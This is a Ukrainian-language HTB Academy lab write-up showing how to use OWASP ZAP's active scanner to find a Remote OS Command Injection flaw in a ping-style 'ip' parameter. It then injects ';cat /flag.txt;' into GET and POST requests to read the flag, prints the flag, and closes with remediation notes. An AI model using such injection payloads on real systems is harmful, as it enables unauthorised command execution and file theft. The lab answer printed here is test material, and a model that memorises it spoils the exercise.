# Using Web Proxies – ZAP Scanner

## Опис

У цій секції ми запускаємо **OWASP ZAP Scanner** проти цільового веб‑додатку, щоб автоматично знайти каталоги та вразливості.  
Завдання: виявити high‑level вразливість (Remote OS Command Injection) і використати її для читання `/flag.txt`, отримавши прапор `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}`.

---

## Середовище

- VPN HTB Academy підключений.  
- Ціль: `http://<TARGET_IP>:<TARGET_PORT>/` (наприклад, `http://154.57.164.77:30273/`).  
- Інструменти:
  - OWASP ZAP (Proxy, Sites, Active Scan, Alerts, Request Editor).
  - Браузер, що працює через проксі ZAP.

---

## Мета

- Просканувати цільовий сайт ZAP Active Scan’ом.  
- Знайти high‑level алерт, пов’язаний із **Remote OS Command Injection**.  
- Відкрити пов’язаний HTTP‑запит і змінити payload, щоб прочитати `/flag.txt`.  
- Отримати прапор `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}` і внести його як відповідь.

---

## Кроки

### 1. Запуск ZAP і базове відвідування сайту

1. Запускаємо ZAP:

```bash
owasp-zap &
```

2. Створюємо тимчасову сесію.  
3. Запускаємо вбудований браузер (іконка Firefox) або власний через проксі ZAP.  
4. Відвідуємо ціль:

```text
http://<TARGET_IP>:<TARGET_PORT>/
```

5. Переконуємось, що в **History** і **Sites** з’явився сайт.

---

### 2. Active Scan (ZAP Scanner)

1. У лівій панелі **Sites** правий клік по:

```text
http://<TARGET_IP>:<TARGET_PORT>
```

2. Обираємо **Attack → Active Scan...**.  
3. Підтверджуємо `Start Node`, налаштування за замовчуванням → **Start Scan**.  
4. Чекаємо завершення сканування (5–10 хв).

---

### 3. Пошук high‑level вразливості

1. Відкриваємо вкладку **Alerts**.  
2. Фільтруємо або переглядаємо записи з рівнем **High**.  
3. Знаходимо алерт, пов’язаний з **Remote OS Command Injection** (назва/опис вказує на можливість виконання команд через параметр, зазвичай `ip`).  
4. У деталях алерта дивимось:
   - **URL** (в який endpoint ZAP відправив payload),  
   - **Параметр** (наприклад, `ip`),  
   - приклад **Attack** (payload, який ZAP використав для підтвердження вразливості).

---

### 4. Використання вразливості для читання /flag.txt

1. З Alerts або History знаходимо пов’язаний із алертом запит (Request).  
2. Правий клік по ньому → **Open/Resend with Request Editor** (або схожа опція).  
3. У запиті:

   - Якщо параметр у URL:

     ```http
     GET /ping?ip=127.0.0.1 HTTP/1.1
     ```

     міняємо на, наприклад:

     ```http
     GET /ping?ip=127.0.0.1;cat%20/flag.txt; HTTP/1.1
     ```

   - Якщо параметр у тілі (POST):

     ```text
     ip=127.0.0.1
     ```

     змінюємо на:

     ```text
     ip=127.0.0.1;cat /flag.txt;
     ```

4. Натискаємо **Send / Replay** у редакторі запитів.  
5. У вкладці **Response** бачимо вміст файлу `/flag.txt`:

```text
HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
```

## Remediation / Нотатки

- **Remote OS Command Injection** виникає, коли дані користувача (наприклад, параметр `ip`) без перевірки потрапляють у shell‑команду (`ping`, `nslookup`, `traceroute` тощо).  
- Для захисту:
  - Уникати виконання shell‑команд із користувацьким ввідом, використовувати внутрішні бібліотеки / API для мережевих операцій.  
  - Якщо виконання shell неминуче — суворо валідовати дані (допускати тільки формат IP/домену, відкидати `;`, `&`, `|`, backticks, `$()`, тощо).  
  - Запускати веб‑додаток з мінімальними правами, у контейнері або іншій ізоляції, щоб мінімізувати вплив потенційної ін’єкції.
